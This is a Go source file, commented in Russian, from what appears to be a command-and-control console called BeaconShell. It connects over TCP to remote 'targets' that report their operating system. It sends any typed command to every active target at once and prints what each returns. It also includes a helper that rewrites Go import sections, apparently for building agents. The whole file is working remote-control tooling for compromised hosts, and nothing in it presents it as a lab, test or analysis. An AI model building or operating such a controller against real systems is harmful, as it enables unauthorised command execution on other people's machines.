package main

import (
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Структура цели
type Target struct {
	name   string
	conn   net.Conn
	status bool
	os     string
	group  string
}

func processRequest(targets *[]Target, input string, mtx *sync.Mutex) {
	// Обработка пустого ввода
	if len(input) <= 1 {
		return
	}

	// Удаление лишних символов
	input = strings.TrimSpace(input)

	// Разбиение команды на аргументы
	splitted_input := strings.Fields(input)

	// Проверка типа команды
	if splitted_input[0] == "/BS" {
		// Выполнение встроенной команды BeaconShell
		BeaconShellRequest(splitted_input, targets, mtx)
	} else {
		// Создание канала для получения результатов команд
		ch_resp := make(chan string)

		// Выполнение команды для каждого активного хоста
		for i := 0; i < len(*targets); i++ {
			if (*targets)[i].status == true {
				// Отправка команды на целевой хост
				go sendCommand((*targets)[i], input, ch_resp)
			}
		}

		// Получение ответов от каждого активного хоста
		for i := 0; i < active_targets; i++ {
			response := <-ch_resp
			if len(response) > 0 {
				fmt.Println(response)
			}
		}
	}
}

func addSession(targets *[]Target, target_name string) {
	// Установка соединения с целевым хостом
	conn, err := net.Dial("tcp", target_name)
	if err != nil {
		BSPrint("%s << Connection NOT established.\n", target_name)
		return
	} else {
		BSPrint("%s << Connection successfully established.\n", target_name)
	}

	// Создание буфера для считывания ОС целевого хоста
	init_buf := make([]byte, global_buffer_size)

	// Чтение ОС хоста
	n, err := conn.Read(init_buf)
	if err != nil {
		BSPrint("Failed to read host OS!\n")
	}

	// Добавление хоста в список целей
	*targets = append(*targets, Target{name: target_name, conn: conn, status: true, os: string(init_buf[:n]), group: "default"})

	active_targets++
}

func finishSession(target Target) {
	if target.conn.Close() == nil {
		BSPrint("%s << Connection successfully terminated.\n", target.name)
	}
}

func finishAllSessions(targets *[]Target) {
	for i := 0; i < len(*targets); i++ {
		finishSession((*targets)[i])
	}
}

func checkTargetNumber(targets *[]Target, input string) (bool, int) {
	idx, err := strconv.Atoi(input)
	if err != nil {
		BSPrint("The index is an invalid number!\n")
		return false, 0
	} else if idx >= len(*targets) || idx < 0 {
		BSPrint("The index is out of bounds!\n")
		return false, 0
	} else {
		return true, idx
	}
}

func checkPositiveNumber(input string) (bool, int) {
	value, err := strconv.Atoi(input)
	if err != nil {
		BSPrint("The value is an invalid number!\n")
		return false, 0
	} else if value < 0 {
		BSPrint("The value lower then zero!\n")
		return false, 0
	} else {
		return true, value
	}
}

// Проверяет наличие необходимых импортов
func isImportContains(imports []string, imp string) bool {
	for _, i := range imports {
		if i == imp {
			return true
		}
	}
	return false
}

// Обновляет секцию импортов
func updateImports(lines []string, new_imports []string) []string {
	var updatedLines []string
	importSectionStarted := false

	for _, line := range lines {
		if strings.HasPrefix(line, "import (") {
			importSectionStarted = true
			updatedLines = append(updatedLines, line)
			for _, imp := range new_imports {
				updatedLines = append(updatedLines, "\t"+imp)
			}
			continue // Пропускаем добавление закрывающей скобки здесь
		}

		if importSectionStarted && strings.TrimSpace(line) == ")" {
			importSectionStarted = false
		}

		updatedLines = append(updatedLines, line)
	}

	if importSectionStarted { // Если секция импорта была открыта, добавим закрывающую скобку
		updatedLines = append(updatedLines, ")")
	}

	return updatedLines
}

// Отправляет команду на целевой хост
func sendCommand(target Target, input string, ch_resp chan string) {
	//if err := target.conn.SetReadDeadline(time.Now().Add(time.Duration(100) * time.Millisecond)); err != nil {}

	// Отправка команды на целевой хост
	_, err := target.conn.Write([]byte(input + "\n"))
	if err != nil {
		BSPrint("Can't send command to %s.\n", target.name)
		// TODO: delete from targets
	}

	// Установка дедлайна для чтения ответа
	if err := target.conn.SetReadDeadline(time.Now().Add(time.Duration(global_response_timeout) * time.Millisecond)); err != nil {
		ch_resp <- fmt.Sprintf("Error setting read deadline for %s: %v", target.name, err)
		log.Fatalln(err)
	}

	// Чтение ответа
	buffer := make([]byte, global_buffer_size)
	n, err := target.conn.Read(buffer)
	if err != nil {
		ch_resp <- ""
		return
	}

	// Отправка ответа в канал
	ch_resp <- fmt.Sprintf("Response from %s:\n%s", target.name, string(buffer[:n]))
}
